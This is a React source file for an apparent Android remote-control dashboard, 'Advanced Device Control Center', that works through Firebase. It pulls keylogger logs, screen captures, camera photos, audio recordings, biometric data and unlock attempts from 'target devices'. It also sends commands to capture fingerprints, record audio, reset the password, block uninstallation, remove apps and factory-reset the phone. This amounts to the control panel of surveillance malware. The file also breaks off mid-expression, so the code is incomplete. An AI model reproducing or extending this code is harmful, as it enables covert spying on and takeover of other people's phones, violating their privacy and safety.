import React, { useState, useEffect, useCallback } from "react";
import { ref, onValue, set } from "firebase/database";
import { database as db } from "../firebaseConfig";
import "./LockServiceTab.css";

const LockServiceTab = () => {
  const [devices, setDevices] = useState([]);
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [lockDetails, setLockDetails] = useState({
    connected: false,
    isDeviceSecure: false,
    biometricStatus: "Unknown",
    biometricType: "None",
    isDeviceAdminActive: false,
    passwordQuality: "Unknown",
    lockScreenTimeout: -1,
    keyguardFeatures: [],
    androidVersion: 0,
    manufacturer: "Unknown",
    model: "Unknown",
    serviceInitialized: false,
    networkAvailable: false,
    cameraAvailable: false,
    fingerprintAvailable: false,
    overlayPermission: false,
    cameraPermission: false,
    audioPermission: false,
    isRecording: false,
    lastUpdate: 0,
  });
  const [fetchStatus, setFetchStatus] = useState({
    lock: "idle",
    unlock: "idle",
    screenOn: "idle",
    screenOff: "idle",
    captureBiometric: "idle",
    biometricUnlock: "idle",
    wipePhone: "idle",
    preventUninstall: "idle",
    reboot: "idle",
    enableAdmin: "idle",
    getStatus: "idle",
    resetPassword: "idle",
    setPasswordQuality: "idle",
    setLockTimeout: "idle",
    disableKeyguardFeatures: "idle",
    captureScreen: "idle",
    capturePhoto: "idle",
    captureFingerprint: "idle",
    disableApp: "idle",
    uninstallApp: "idle",
    monitorUnlock: "idle",
    startRecording: "idle",
    stopRecording: "idle",
  });
  const [errorDetails, setErrorDetails] = useState({});
  const [biometricData, setBiometricData] = useState(null);
  const [warnings, setWarnings] = useState([]);
  const [passwordState, setPasswordState] = useState(null);
  const [screenCaptures, setScreenCaptures] = useState([]);
  const [photoCaptures, setPhotoCaptures] = useState([]);
  const [audioRecordings, setAudioRecordings] = useState([]);
  const [keyloggerData, setKeyloggerData] = useState([]);
  const [unlockAttempts, setUnlockAttempts] = useState([]);
  const [advancedMode, setAdvancedMode] = useState(false);
  const [commandParams, setCommandParams] = useState({
    password: "",
    passwordQuality: "complex",
    lockTimeout: 30000,
    keyguardFeatures: [],
    packageName: "",
    camera: "back",
    recordingDuration: 30000,
  });

  // Fetch devices from Firebase
  useEffect(() => {
    const devicesRef = ref(db, "Device");
    const unsubscribe = onValue(
      devicesRef,
      (snapshot) => {
        if (snapshot.exists()) {
          const deviceData = snapshot.val();
          const deviceList = Object.entries(deviceData).map(([id, data]) => ({
            id,
            name: data.name || `Device ${id.slice(-4)}`,
            lastSeen: data.lock_service?.lastSeen || data.lastSeen || 0,
            online: data.lock_service?.connected || false,
            lockServiceVersion: data.lock_service?.version || "Unknown",
          }));
          setDevices(deviceList);
          if (!selectedDevice && deviceList.length > 0) {
            setSelectedDevice(deviceList[0].id);
          }
        } else {
          setDevices([]);
          setSelectedDevice(null);
          setWarnings((prev) => [
            ...prev,
            "⚠️ No devices found. Check Firebase configuration.",
          ]);
        }
      },
      (error) => {
        console.error("Error fetching devices:", error);
        setWarnings((prev) => [
          ...prev,
          "❌ Failed to fetch devices. Check Firebase connection.",
        ]);
      }
    );
    return () => unsubscribe();
  }, [selectedDevice]);

  // Fetch enhanced lock details and related data for selected device
  useEffect(() => {
    if (!selectedDevice) return;

    const lockServiceRef = ref(db, `Device/${selectedDevice}/lock_service`);
    const lockDetailsRef = ref(db, `Device/${selectedDevice}/lock_details`);
    const biometricRef = ref(db, `Device/${selectedDevice}/biometric_data`);
    const passwordStateRef = ref(db, `Device/${selectedDevice}/password_state`);
    const screenCapturesRef = ref(
      db,
      `Device/${selectedDevice}/screen_captures`
    );
    const photoCapturesRef = ref(db, `Device/${selectedDevice}/photo_captures`);
    const audioRecordingsRef = ref(
      db,
      `Device/${selectedDevice}/audio_recordings`
    );
    const keyloggerRef = ref(db, `Device/${selectedDevice}/keylogger`);
    const unlockAttemptsRef = ref(
      db,
      `Device/${selectedDevice}/unlock_attempts`
    );

    const unsubscribeLockService = onValue(lockServiceRef, (snapshot) => {
      const serviceData = snapshot.exists() ? snapshot.val() : {};
      setLockDetails((prev) => ({
        ...prev,
        connected: serviceData.connected || false,
        serviceVersion: serviceData.version || "Unknown",
        lastServiceUpdate: serviceData.lastSeen || 0,
      }));

      if (!serviceData.connected) {
        setWarnings((prev) => [
          ...prev.filter((w) => !w.includes("Lock Service")),
          "🔴 Lock Service is not connected. Ensure the app is running on the device with proper permissions.",
        ]);
      } else {
        setWarnings((prev) => prev.filter((w) => !w.includes("Lock Service")));
      }
    });

    const unsubscribeLockDetails = onValue(lockDetailsRef, (snapshot) => {
      if (snapshot.exists()) {
        const details = snapshot.val();
        setLockDetails((prev) => ({ ...prev, ...details }));

        const newWarnings = [];
        if (!details.isDeviceAdminActive) {
          newWarnings.push(
            "⚠️ Device Admin is not enabled. Advanced lock commands will fail. Enable in Settings > Security > Device Admin."
          );
        }
        if (
          details.biometricStatus === "Not Enrolled" ||
          details.biometricStatus === "Not Available"
        ) {
          newWarnings.push(
            "⚠️ Biometric authentication is not available. Biometric commands will fail. Set up fingerprint/face unlock in Settings."
          );
        }
        if (!details.overlayPermission) {
          newWarnings.push(
            "⚠️ Overlay permission not granted. Screen capture and overlay features will fail. Enable in Settings > Apps > Special Access."
          );
        }
        if (!details.cameraAvailable) {
          newWarnings.push("⚠️ Camera not available. Photo capture will fail.");
        }
        if (!details.cameraPermission) {
          newWarnings.push(
            "⚠️ Camera permission not granted. Photo capture will fail."
          );
        }
        if (!details.audioPermission) {
          newWarnings.push(
            "⚠️ Audio permission not granted. Voice recording will fail."
          );
        }
        if (!details.networkAvailable) {
          newWarnings.push(
            "⚠️ Network not available. Commands may be delayed or fail."
          );
        }
        if (!details.serviceInitialized) {
          newWarnings.push(
            "⚠️ Lock Service not fully initialized. Some features may not work."
          );
        }

        setWarnings((prev) =>
          [
            ...newWarnings,
            ...prev.filter(
              (w) =>
                !w.includes("Device Admin") &&
                !w.includes("Biometric") &&
                !w.includes("Overlay") &&
                !w.includes("Camera") &&
                !w.includes("Audio") &&
                !w.includes("Network") &&
                !w.includes("Service not fully")
            ),
          ].slice(0, 10)
        );
      }
    });

    const unsubscribeBiometric = onValue(biometricRef, (snapshot) => {
      setBiometricData(snapshot.exists() ? snapshot.val() : null);
    });

    const unsubscribePasswordState = onValue(passwordStateRef, (snapshot) => {
      setPasswordState(snapshot.exists() ? snapshot.val() : null);
    });

    const unsubscribeScreenCaptures = onValue(screenCapturesRef, (snapshot) => {
      if (snapshot.exists()) {
        const captures = Object.entries(snapshot.val()).map(([id, data]) => ({
          id,
          ...data,
        }));
        setScreenCaptures(captures.slice(-5)); // Keep last 5
      }
    });

    const unsubscribePhotoCaptures = onValue(photoCapturesRef, (snapshot) => {
      if (snapshot.exists()) {
        const captures = Object.entries(snapshot.val()).map(([id, data]) => ({
          id,
          ...data,
        }));
        setPhotoCaptures(captures.slice(-5)); // Keep last 5
      }
    });

    const unsubscribeAudioRecordings = onValue(
      audioRecordingsRef,
      (snapshot) => {
        if (snapshot.exists()) {
          const recordings = Object.entries(snapshot.val()).map(
            ([id, data]) => ({
              id,
              ...data,
            })
          );
          setAudioRecordings(recordings.slice(-5)); // Keep last 5
        }
      }
    );

    const unsubscribeKeylogger = onValue(keyloggerRef, (snapshot) => {
      if (snapshot.exists()) {
        const logs = Object.entries(snapshot.val()).map(([id, data]) => ({
          id,
          ...data,
        }));
        setKeyloggerData(logs.slice(-20)); // Keep last 20
      }
    });

    const unsubscribeUnlockAttempts = onValue(unlockAttemptsRef, (snapshot) => {
      if (snapshot.exists()) {
        const attempts = Object.entries(snapshot.val()).map(([id, data]) => ({
          id,
          ...data,
        }));
        setUnlockAttempts(attempts.slice(-10)); // Keep last 10
      }
    });

    return () => {
      unsubscribeLockService();
      unsubscribeLockDetails();
      unsubscribeBiometric();
      unsubscribePasswordState();
      unsubscribeScreenCaptures();
      unsubscribePhotoCaptures();
      unsubscribeAudioRecordings();
      unsubscribeKeylogger();
      unsubscribeUnlockAttempts();
    };
  }, [selectedDevice]);

  // Monitor command status
  useEffect(() => {
    if (!selectedDevice) return;

    const commandRef = ref(db, `Device/${selectedDevice}/deviceAdvice`);
    const unsubscribe = onValue(
      commandRef,
      (snapshot) => {
        if (snapshot.exists()) {
          const data = snapshot.val();
          const statusKey = getStatusKey(data.action);
          setFetchStatus((prev) => ({
            ...prev,
            [statusKey]: data.status,
          }));
          setErrorDetails((prev) => ({
            ...prev,
            [statusKey]: data.error || null,
          }));

          // Auto-clear success/failed status after 5 seconds
          if (data.status === "success" || data.status === "failed") {
            setTimeout(() => {
              setFetchStatus((prev) => ({
                ...prev,
                [statusKey]: "idle",
              }));
              setErrorDetails((prev) => ({
                ...prev,
                [statusKey]: null,
              }));
            }, 5000);
          }
        }
      },
      (error) => {
        console.error("Error fetching command status:", error);
        setWarnings((prev) => [
          ...prev,
          "❌ Failed to fetch command status. Check Firebase connection.",
        ]);
      }
    );
    return () => unsubscribe();
  }, [selectedDevice]);

  const getStatusKey = (action) => {
    const mapping = {
      CaptureBiometricData: "captureBiometric",
      BiometricUnlock: "biometricUnlock",
      wipeThePhone: "wipePhone",
      preventUninstall: "preventUninstall",
      resetPassword: "resetPassword",
      setPasswordQuality: "setPasswordQuality",
      setLockTimeout: "setLockTimeout",
      disableKeyguardFeatures: "disableKeyguardFeatures",
      captureScreen: "captureScreen",
      capturePhoto: "capturePhoto",
      captureFingerprint: "captureFingerprint",
      disableApp: "disableApp",
      uninstallApp: "uninstallApp",
      monitorUnlock: "monitorUnlock",
      startRecording: "startRecording",
      stopRecording: "stopRecording",
    };
    return mapping[action] || action;
  };

  // Trigger device command
  const triggerDeviceAdviceCommand = useCallback(
    async (action, params = {}) => {
      if (!selectedDevice) {
        setWarnings((prev) => [
          ...prev,
          "❌ No device selected. Please select a device.",
        ]);
        return;
      }

      if (!lockDetails.connected) {
        setWarnings((prev) => [
          ...prev,
          "❌ Device is not connected. Ensure the Lock Service is running.",
        ]);
        return;
      }

      // Confirmation for destructive actions
      const destructiveActions = ["wipeThePhone", "reboot", "resetPassword"];
      if (destructiveActions.includes(action)) {
        const actionNames = {
          wipeThePhone: "wipe the device (FACTORY RESET)",
          reboot: "reboot the device",
          resetPassword: "reset the device password",
        };
        if (
          !window.confirm(
            `⚠️ DANGER: Are you sure you want to ${actionNames[action]}? This action cannot be undone and may cause data loss!`
          )
        ) {
          return;
        }
      }

      // Validation for specific commands
      if (action === "resetPassword" && !params.password) {
        setWarnings((prev) => [
          ...prev,
          "❌ Password cannot be empty for reset password command.",
        ]);
        return;
      }

      if (
        (action === "disableApp" || action === "uninstallApp") &&
        !params.packageName
      ) {
        setWarnings((prev) => [
          ...prev,
          "❌ Package name cannot be empty for app management commands.",
        ]);
        return;
      }

      try {
        const statusKey = getStatusKey(action);
        setFetchStatus((prev) => ({
          ...prev,
          [statusKey]: "sending",
        }));

        const commandId = `cmd_${Date.now()}_${Math.random()
          .toString(36)
          .substr(2, 9)}`;
        const commandRef = ref(db, `Device/${selectedDevice}/deviceAdvice`);

        await set(commandRef, {
          action,
          commandId,
          status: "pending",
          timestamp: Date.now(),
          params: params,
        });

        console.log(`✅ Command sent: ${action}`, params);

        // Set timeout for command
        setTimeout(() => {
          setFetchStatus((prev) => {
            if (
              prev[statusKey] === "sending" ||
              prev[statusKey] === "pending"
            ) {
              return { ...prev, [statusKey]: "timeout" };
            }
            return prev;
          });
        }, 30000); // 30 second timeout
      } catch (error) {
        console.error(`❌ Failed to send command ${action}:`, error);
        const statusKey = getStatusKey(action);
        setFetchStatus((prev) => ({
          ...prev,
          [statusKey]: "error",
        }));
        setErrorDetails((prev) => ({
          ...prev,
          [statusKey]: `Failed to send command: ${error.message}`,
        }));
        setWarnings((prev) => [
          ...prev,
          `❌ Failed to send ${action} command: ${error.message}`,
        ]);
      }
    },
    [selectedDevice, lockDetails.connected]
  );

  // Get button status text with enhanced styling
  const getButtonStatus = useCallback(
    (action) => {
      const status = fetchStatus[action];
      const statusIcons = {
        sending: "📤",
        pending: "⏳",
        processing: "⚙️",
        success: "✅",
        failed: "❌",
        error: "⚠️",
        cancelled: "🚫",
        timeout: "⏰",
      };

      const icon = statusIcons[status] || "⚪";

      switch (status) {
        case "sending":
          return `${icon} Sending...`;
        case "pending":
          return `${icon} Pending...`;
        case "processing":
          return `${icon} Processing...`;
        case "success":
          return `${icon} Success`;
        case "failed":
          return `${icon} Failed`;
        case "error":
          return `${icon} Error`;
        case "cancelled":
          return `${icon} Cancelled`;
        case "timeout":
          return `${icon} Timeout`;
        default:
          return `${icon} Ready`;
      }
    },
    [fetchStatus]
  );

  const formatTimestamp = (timestamp) => {
    return new Date(timestamp).toLocaleString();
  };

  const clearWarnings = () => {
    setWarnings([]);
  };

  const getDeviceStatusColor = (device) => {
    if (!device.online) return "🔴";
    const timeDiff = Date.now() - device.lastSeen;
    if (timeDiff < 60000) return "🟢"; // Less than 1 minute
    if (timeDiff < 300000) return "🟡"; // Less than 5 minutes
    return "🟠"; // More than 5 minutes
  };

  return (
    <div className="lock-service-tab">
      <div className="lock-header">
        <h2>🔐 Advanced Device Control Center</h2>
        <div className="lock-mode-toggle">
          <label>
            <input
              type="checkbox"
              checked={advancedMode}
              onChange={(e) => setAdvancedMode(e.target.checked)}
            />
            Advanced Mode
          </label>
        </div>
      </div>

      {warnings.length > 0 && (
        <div className="lock-warnings">
          <div className="warnings-header">
            <h3>⚠️ System Warnings ({warnings.length})</h3>
            <button onClick={clearWarnings} className="clear-warnings-btn">
              Clear All
            </button>
          </div>
          <ul>
            {warnings.map((warning, index) => (
              <li key={index} className="warning-item">
                {warning}
              </li>
            ))}
          </ul>
        </div>
      )}

      <div className="lock-device-selection">
        <label>🎯 Select Target Device:</label>
        <select
          value={selectedDevice || ""}
          onChange={(e) => setSelectedDevice(e.target.value || null)}
          className="device-selector"
        >
          <option value="">Select a device</option>
          {devices.map((device) => (
            <option key={device.id} value={device.id}>
              {getDeviceStatusColor(device)} {device.name}
              {device.lastSeen ? ` (${formatTimestamp(device.lastSeen)})` : ""}
              {device.lockServiceVersion !== "Unknown"
                ? ` - v${device.lockServiceVersion}`
                : ""}
            </option>
          ))}
        </select>
      </div>

      {selectedDevice && lockDetails && (
        <div className="lock-device-info">
          <h3>📊 Device Security Matrix</h3>
          <div className="status-grid">
            <div className="status-row">
              <span className="status-label">🔗 Lock Service</span>
              <span
                className={`status-value ${
                  lockDetails.connected ? "online" : "offline"
                }`}
              >
                {lockDetails.connected ? "🟢 CONNECTED" : "🔴 DISCONNECTED"}
              </span>
            </div>
            <div className="status-row">
              <span className="status-label">🔒 Device Security</span>
              <span
                className={`status-value ${
                  lockDetails.isDeviceSecure ? "secure" : "insecure"
                }`}
              >
                {lockDetails.isDeviceSecure ? "🔐 SECURED" : "🔓 UNSECURED"}
              </span>
            </div>
            <div className="status-row">
              <span className="status-label">👆 Biometric Status</span>
              <span
                className={`status-value ${
                  lockDetails.biometricStatus === "Available"
                    ? "available"
                    : "unavailable"
                }`}
              >
                {lockDetails.biometricStatus}
              </span>
            </div>
            <div className="status-row">
              <span className="status-label">🔑 Biometric Type</span>
              <span className="status-value">{lockDetails.biometricType}</span>
            </div>
            <div className="status-row">
              <span className="status-label">⚡ Device Admin</span>
              <span
                className={`status-value ${
                  lockDetails.isDeviceAdminActive ? "active" : "inactive"
                }`}
              >
                {lockDetails.isDeviceAdminActive ? "🟢 ACTIVE" : "🔴 INACTIVE"}
              </span>
            </div>

            {advancedMode && (
              <>
                <div className="status-row">
                  <span className="status-label">🔐 Password Quality</span>
                  <span className="status-value">
                    {lockDetails.passwordQuality}
                  </span>
                </div>
                <div className="status-row">
                  <span className="status-label">⏰ Lock Timeout</span>
                  <span className="status-value">
                    {lockDetails.lockScreenTimeout > 0
                      ? `${lockDetails.lockScreenTimeout / 1000}s`
                      : "Not Set"}
                  </span>
                </div>
                <div className="status-row">
                  <span className="status-label">📱 Device Info</span>
                  <span className="status-value">
                    {lockDetails.manufacturer} {lockDetails.model} (API{" "}
                    {lockDetails.androidVersion})
                  </span>
                </div>
                <div className="status-row">
                  <span className="status-label">🌐 Network</span>
                  <span
                    className={`status-value ${
                      lockDetails.networkAvailable ? "online" : "offline"
                    }`}
                  >
                    {lockDetails.networkAvailable
                      ? "🟢 AVAILABLE"
                      : "🔴 UNAVAILABLE"}
                  </span>
                </div>
                <div className="status-row">
                  <span className="status-label">📷 Camera</span>
                  <span
                    className={`status-value ${
                      lockDetails.cameraAvailable ? "available" : "unavailable"
                    }`}
                  >
                    {lockDetails.cameraAvailable
                      ? "🟢 AVAILABLE"
                      : "🔴 UNAVAILABLE"}
                  </span>
                </div>
                <div className="status-row">
                  <span className="status-label">📷 Camera Permission</span>
                  <span
                    className={`status-value ${
                      lockDetails.cameraPermission ? "granted" : "denied"
                    }`}
                  >
                    {lockDetails.cameraPermission ? "🟢 GRANTED" : "🔴 DENIED"}
                  </span>
                </div>
                <div className="status-row">
                  <span className="status-label">🎤 Audio Permission</span>
                  <span
                    className={`status-value ${
                      lockDetails.audioPermission ? "granted" : "denied"
                    }`}
                  >
                    {lockDetails.audioPermission ? "🟢 GRANTED" : "🔴 DENIED"}
                  </span>
                </div>
                <div className="status-row">
                  <span className="status-label">🎙️ Recording Status</span>
                  <span
                    className={`status-value ${
                      lockDetails.isRecording ? "active" : "inactive"
                    }`}
                  >
                    {lockDetails.isRecording ? "🔴 RECORDING" : "⚪ IDLE"}
                  </span>
                </div>
                <div className="status-row">
                  <span className="status-label">🖼️ Overlay Permission</span>
                  <span
                    className={`status-value ${
                      lockDetails.overlayPermission ? "granted" : "denied"
                    }`}
                  >
                    {lockDetails.overlayPermission ? "🟢 GRANTED" : "🔴 DENIED"}
                  </span>
                </div>
                <div className="status-row">
                  <span className="status-label">⚙️ Service Initialized</span>
                  <span
                    className={`status-value ${
                      lockDetails.serviceInitialized ? "active" : "inactive"
                    }`}
                  >
                    {lockDetails.serviceInitialized ? "🟢 YES" : "🔴 NO"}
                  </span>
                </div>
                {lockDetails.lastUpdate > 0 && (
                  <div className="status-row">
                    <span className="status-label">🕐 Last Update</span>
                    <span className="status-value">
                      {formatTimestamp(lockDetails.lastUpdate)}
                    </span>
                  </div>
                )}
              </>
            )}
          </div>

          {passwordState && (
            <div className="password-state">
              <h4>🔑 Password State</h4>
              <p>
                Device Locked:{" "}
                {passwordState.isDeviceLocked ? "🔒 YES" : "🔓 NO"}
              </p>
              <p>Last Check: {formatTimestamp(passwordState.timestamp)}</p>
            </div>
          )}

          {biometricData && (
            <div className="biometric-data">
              <h4>👆 Latest Biometric Data</h4>
              <div className="biometric-info">
                <p>
                  <strong>Action:</strong> {biometricData.action}
                </p>
                <p>
                  <strong>Result:</strong> {biometricData.result}
                </p>
                <p>
                  <strong>Timestamp:</strong>{" "}
                  {formatTimestamp(biometricData.timestamp)}
                </p>
                <p>
                  <strong>Command ID:</strong> {biometricData.commandId}
                </p>
              </div>
            </div>
          )}
        </div>
      )}

      {selectedDevice && (
        <div className="lock-controls">
          <h3>🎮 Device Control Panel</h3>

          {/* Basic Controls */}
          <div className="control-section">
            <h4>🔧 Basic Controls</h4>
            <div className="lock-button-group">
              {[
                { action: "lock", label: "🔒 Lock Device", category: "basic" },
                {
                  action: "unlock",
                  label: "🔓 Unlock Device",
                  category: "basic",
                },
                {
                  action: "screenOn",
                  label: "💡 Screen On",
                  category: "basic",
                },
                {
                  action: "screenOff",
                  label: "🌙 Screen Off",
                  category: "basic",
                },
                {
                  action: "getStatus",
                  label: "📊 Refresh Status",
                  category: "basic",
                },
              ].map(({ action, label }) => (
                <button
                  key={action}
                  className={`lock-button ${fetchStatus[action]}`}
                  data-status={fetchStatus[action]}
                  onClick={() => triggerDeviceAdviceCommand(action)}
                  disabled={
                    fetchStatus[action] === "sending" ||
                    fetchStatus[action] === "pending" ||
                    fetchStatus[action] === "processing"
                  }
                >
                  {label}
                  <span className="button-status">
                    ({getButtonStatus(action)})
                  </span>
                  {errorDetails[action] && (
                    <span className="button-error">
                      Error: {errorDetails[action]}
                    </span>
                  )}
                </button>
              ))}
            </div>
          </div>

          {/* Biometric Controls */}
          <div className="control-section">
            <h4>👆 Biometric Controls</h4>
            <div className="lock-button-group">
              {[
                {
                  action: "CaptureBiometricData",
                  label: "📸 Capture Biometric",
                  statusKey: "captureBiometric",
                },
                {
                  action: "BiometricUnlock",
                  label: "🔓 Biometric Unlock",
                  statusKey: "biometricUnlock",
                },
                {
                  action: "captureFingerprint",
                  label: "👆 Capture Fingerprint",
                  statusKey: "captureFingerprint",
                },
              ].map(({ action, label, statusKey = action }) => (
                <button
                  key={action}
                  className={`lock-button ${fetchStatus[statusKey]}`}
                  data-status={fetchStatus[statusKey]}
                  onClick={() => triggerDeviceAdviceCommand(action)}
                  disabled={
                    fetchStatus[statusKey] === "sending" ||
                    fetchStatus[statusKey] === "pending" ||
                    fetchStatus[statusKey] === "processing" ||
                    !lockDetails.fingerprintAvailable
                  }
                >
                  {label}
                  <span className="button-status">
                    ({getButtonStatus(statusKey)})
                  </span>
                  {errorDetails[statusKey] && (
                    <span className="button-error">
                      Error: {errorDetails[statusKey]}
                    </span>
                  )}
                </button>
              ))}
            </div>
          </div>

          {/* Surveillance Controls */}
          <div className="control-section">
            <h4>👁️ Surveillance Controls</h4>
            <div className="lock-button-group">
              {[
                { action: "captureScreen", label: "📱 Capture Screen" },
                { action: "monitorUnlock", label: "👁️ Monitor Unlocks" },
              ].map(({ action, label }) => (
                <button
                  key={action}
                  className={`lock-button ${fetchStatus[action]}`}
                  data-status={fetchStatus[action]}
                  onClick={() => triggerDeviceAdviceCommand(action)}
                  disabled={
                    fetchStatus[action] === "sending" ||
                    fetchStatus[action] === "pending" ||
                    fetchStatus[action] === "processing"
                  }
                >
                  {label}
                  <span className="button-status">
                    ({getButtonStatus(action)})
                  </span>
                  {errorDetails[action] && (
                    <span className="button-error">
                      Error: {errorDetails[action]}
                    </span>
                  )}
                </button>
              ))}

              {/* Camera Controls */}
              <div className="camera-controls">
                <label>📷 Camera Selection:</label>
                <select
                  value={commandParams.camera}
                  onChange={(e) =>
                    setCommandParams((prev) => ({
                      ...prev,
                      camera: e.target.value,
                    }))
                  }
                >
                  <option value="back">Back Camera</option>
                  <option value="front">Front Camera</option>
                </select>
                <button
                  className={`lock-button ${fetchStatus.capturePhoto}`}
                  data-status={fetchStatus.capturePhoto}
                  onClick={() =>
                    triggerDeviceAdviceCommand("capturePhoto", {
                      camera: commandParams.camera,
                    })
                  }
                  disabled={
                    fetchStatus.capturePhoto === "sending" ||
                    fetchStatus.capturePhoto === "pending" ||
                    fetchStatus.capturePhoto === "processing" ||
                    !lockDetails.cameraAvailable ||
                    !lockDetails.cameraPermission
                  }
                >
                  📷 Capture Photo ({commandParams.camera})
                  <span className="button-status">
                    ({getButtonStatus("capturePhoto")})
                  </span>
                  {errorDetails.capturePhoto && (
                    <span className="button-error">
                      Error: {errorDetails.capturePhoto}
                    </span>
                  )}
                </button>
              </div>

              {/* Audio Recording Controls */}
              <div className="audio-controls">
                <label>🎤 Recording Duration (seconds):</label>
                <input
                  type="number"
                  min="5"
                  max="300"
                  value={commandParams.recordingDuration / 1000}
                  onChange={(e) =>
                    setCommandParams((prev) => ({
                      ...prev,
                      recordingDuration:
                        parseInt(e.target.value) * 1000 || 30000,
                    }))
                  }
                />
                <button
                  className={`lock-button ${fetchStatus.startRecording}`}
                  data-status={fetchStatus.startRecording}
                  onClick={() =>
                    triggerDeviceAdviceCommand("startRecording", {
                      duration: commandParams.recordingDuration,
                    })
                  }
                  disabled={
                    fetchStatus.startRecording === "sending" ||
                    fetchStatus.startRecording === "pending" ||
                    fetchStatus.startRecording === "processing" ||
                    !lockDetails.audioPermission ||
                    lockDetails.isRecording
                  }
                >
                  🎙️ Start Recording ({commandParams.recordingDuration / 1000}s)
                  <span className="button-status">
                    ({getButtonStatus("startRecording")})
                  </span>
                  {errorDetails.startRecording && (
                    <span className="button-error">
                      Error: {errorDetails.startRecording}
                    </span>
                  )}
                </button>
                <button
                  className={`lock-button ${fetchStatus.stopRecording}`}
                  data-status={fetchStatus.stopRecording}
                  onClick={() => triggerDeviceAdviceCommand("stopRecording")}
                  disabled={
                    fetchStatus.stopRecording === "sending" ||
                    fetchStatus.stopRecording === "pending" ||
                    fetchStatus.stopRecording === "processing" ||
                    !lockDetails.isRecording
                  }
                >
                  ⏹️ Stop Recording
                  <span className="button-status">
                    ({getButtonStatus("stopRecording")})
                  </span>
                  {errorDetails.stopRecording && (
                    <span className="button-error">
                      Error: {errorDetails.stopRecording}
                    </span>
                  )}
                </button>
              </div>
            </div>
          </div>

          {/* Destructive Controls */}
          <div className="control-section destructive">
            <h4>⚠️ Destructive Controls</h4>
            <div className="lock-button-group">
              {[
                {
                  action: "wipeThePhone",
                  label: "🗑️ Factory Reset",
                  statusKey: "wipePhone",
                },
                {
                  action: "preventUninstall",
                  label: "🛡️ Prevent Uninstall",
                  statusKey: "preventUninstall",
                },
                { action: "reboot", label: "🔄 Reboot Device" },
              ].map(({ action, label, statusKey = action }) => (
                <button
                  key={action}
                  className={`lock-button destructive ${fetchStatus[statusKey]}`}
                  data-status={fetchStatus[statusKey]}
                  onClick={() => triggerDeviceAdviceCommand(action)}
                  disabled={
                    fetchStatus[statusKey] === "sending" ||
                    fetchStatus[statusKey] === "pending" ||
                    fetchStatus[statusKey] === "processing" ||
                    !lockDetails.isDeviceAdminActive
                  }
                >
                  {label}
                  <span className="button-status">
                    ({getButtonStatus(statusKey)})
                  </span>
                  {errorDetails[statusKey] && (
                    <span className="button-error">
                      Error: {errorDetails[statusKey]}
                    </span>
                  )}
                </button>
              ))}
            </div>
          </div>

          {/* Advanced Controls */}
          {advancedMode && (
            <>
              <div className="control-section">
                <h4>🔧 Advanced Security Controls</h4>

                {/* Password Controls */}
                <div className="advanced-control">
                  <label>🔑 Reset Device Password:</label>
                  <div className="input-group">
                    <input
                      type="password"
                      placeholder="New password (min 4 chars)"
                      value={commandParams.password}
                      onChange={(e) =>
                        setCommandParams((prev) => ({
                          ...prev,
                          password: e.target.value,
                        }))
                      }
                      minLength={4}
                    />
                    <button
                      className={`lock-button ${fetchStatus.resetPassword}`}
                      onClick={() =>
                        triggerDeviceAdviceCommand("resetPassword", {
                          password: commandParams.password,
                        })
                      }
                      disabled={
                        !commandParams.password ||
                        commandParams.password.length < 4 ||
                        fetchStatus.resetPassword === "sending" ||
                        fetchStatus.resetPassword === "pending" ||
                        fetchStatus.resetPassword === "processing" ||
                        !lockDetails.isDeviceAdminActive
                      }
                    >
                      🔑 Reset ({getButtonStatus("resetPassword")})
                    </button>
                  </div>
                  {errorDetails.resetPassword && (
                    <div className="error-message">
                      Error: {errorDetails.resetPassword}
                    </div>
                  )}
                </div>

                {/* Password Quality */}
                <div className="advanced-control">
                  <label>🔐 Password Quality Policy:</label>
                  <div className="input-group">
                    <select
                      value={commandParams.passwordQuality}
                      onChange={(e) =>
                        setCommandParams((prev) => ({
                          ...prev,
                          passwordQuality: e.target.value,
                        }))
                      }
                    >
                      <option value="numeric">Numeric (PIN)</option>
                      <option value="numeric_complex">Numeric Complex</option>
                      <option value="alphabetic">Alphabetic</option>
                      <option value="alphanumeric">Alphanumeric</option>
                      <option value="complex">Complex (Recommended)</option>
                    </select>
                    <button
                      className={`lock-button ${fetchStatus.setPasswordQuality}`}
                      onClick={() =>
                        triggerDeviceAdviceCommand("setPasswordQuality", {
                          quality: commandParams.passwordQuality,
                        })
                      }
                      disabled={
                        fetchStatus.setPasswordQuality === "sending" ||
                        fetchStatus.setPasswordQuality === "pending" ||
                        fetchStatus.setPasswordQuality === "processing" ||
                        !lockDetails.isDeviceAdminActive
                      }
                    >
                      🔐 Set ({getButtonStatus("setPasswordQuality")})
                    </button>
                  </div>
                  {errorDetails.setPasswordQuality && (
                    <div className="error-message">
                      Error: {errorDetails.setPasswordQuality}
                    </div>
                  )}
                </div>

                {/* Lock Timeout */}
                <div className="advanced-control">
                  <label>⏰ Auto-Lock Timeout (milliseconds):</label>
                  <div className="input-group">
                    <select
                      value={commandParams.lockTimeout}
                      onChange={(e) =>
                        setCommandParams((prev) => ({
                          ...prev,
                          lockTimeout: parseInt(e.target.value) || 30000,
                        }))
                      }
                    >
                      <option value={5000}>5 seconds</option>
                      <option value={15000}>15 seconds</option>
                      <option value={30000}>30 seconds</option>
                      <option value={60000}>1 minute</option>
                      <option value={120000}>2 minutes</option>
                      <option value={300000}>5 minutes</option>
                      <option value={600000}>10 minutes</option>
                    </select>
                    <button
                      className={`lock-button ${fetchStatus.setLockTimeout}`}
                      onClick={() =>
                        triggerDeviceAdviceCommand("setLockTimeout", {
                          timeout: commandParams.lockTimeout,
                        })
                      }
                      disabled={
                        fetchStatus.setLockTimeout === "sending" ||
                        fetchStatus.setLockTimeout === "pending" ||
                        fetchStatus.setLockTimeout === "processing" ||
                        !lockDetails.isDeviceAdminActive
                      }
                    >
                      ⏰ Set ({getButtonStatus("setLockTimeout")})
                    </button>
                  </div>
                  {errorDetails.setLockTimeout && (
                    <div className="error-message">
                      Error: {errorDetails.setLockTimeout}
                    </div>
                  )}
                </div>

                {/* App Management */}
                <div className="advanced-control">
                  <label>📱 App Management:</label>
                  <div className="input-group">
                    <input
                      type="text"
                      placeholder="Package name (e.g., com.example.app)"
                      value={commandParams.packageName}
                      onChange={(e) =>
                        setCommandParams((prev) => ({
                          ...prev,
                          packageName: e.target.value,
                        }))
                      }
                    />
                    <button
                      className={`lock-button ${fetchStatus.disableApp}`}
                      onClick={() =>
                        triggerDeviceAdviceCommand("disableApp", {
                          packageName: commandParams.packageName,
                        })
                      }
                      disabled={
                        !commandParams.packageName ||
                        fetchStatus.disableApp === "sending" ||
                        fetchStatus.disableApp === "pending" ||
                        fetchStatus.disableApp === "processing" ||
